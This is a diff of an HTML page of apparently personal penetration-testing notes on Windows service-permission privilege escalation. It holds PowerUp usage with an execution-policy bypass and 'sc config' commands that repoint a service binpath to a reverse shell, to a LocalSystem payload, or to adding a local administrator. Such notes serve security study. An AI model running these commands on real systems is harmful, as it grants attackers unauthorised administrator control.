@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -76,14 +76,18 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="fb35617e-95ee-409d-a517-c3e3303a9456" class="page sans"><header><h1 class="page-title">Service Permissions (Paths)</h1></header><div class="page-body"><h2 id="ed3787e4-0ec5-4a60-9e30-3575c28d127e" class="">Insecure Service Permissions:</h2><pre id="0735f3d7-560b-4db4-89e2-8fad51cf2e9f" class="code"><code>PS&gt; Get-Service
+    <main class="main"><article id="fb35617e-95ee-409d-a517-c3e3303a9456" class="page sans"><header><h1 class="page-title">Service Permissions (Paths)</h1></header><div class="page-body"><h2 id="ed3787e4-0ec5-4a60-9e30-3575c28d127e" class="">Insecure Service Permissions:</h2><pre id="0735f3d7-560b-4db4-89e2-8fad51cf2e9f" class="code"><code>#Get all services
+PS&gt; Get-Service
+#Check service permissions
 PS&gt; Get-Service &lt;service&gt; | fl
 PS&gt; Get-Service &lt;service&gt; | gm
+
 PS&gt; Get-Service | where CanStop -eq $true
 PS&gt; Get-Service | where CanPauseAndContinue -eq $true
 
 PS&gt; Get-ChildItem &quot;Registry::HKLM\SystemCurrentControlSet\Services\&lt;service&gt;&quot;
 PS&gt; Get-ACL C:\PathToService | fl
+#start the service
 PS&gt; Start-Service &lt;service&gt;</code></pre><p id="3e5564c6-dd0e-48e9-8107-55b2358e9c4a" class=""><strong>Binary Paths:</strong></p><p id="05cb546b-a6e0-4e84-b3bb-1c09b341ee62" class="">Powerup method (easy):</p><pre id="9896f129-1b05-4fa8-b384-8aee89f346e0" class="code"><code>powershell -ep bypass
 . .\PowerUp.ps1
 Invoke-AllChecks
@@ -96,6 +100,8 @@ Accesschk64.exe -uwcv &lt;service-found&gt;
 sc qc &lt;service-found&gt;
 #Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
 sc config &lt;service-found&gt; binpath= &quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;
+#OR
+sc config &lt;service&gt; binpath=&quot;c:\Users\user\Desktop\payload.exe&quot; obj= Localsystem
 #OR
 sc config &lt;service-found&gt; binpath= &quot;net localgroup administrators user /add&quot;
 
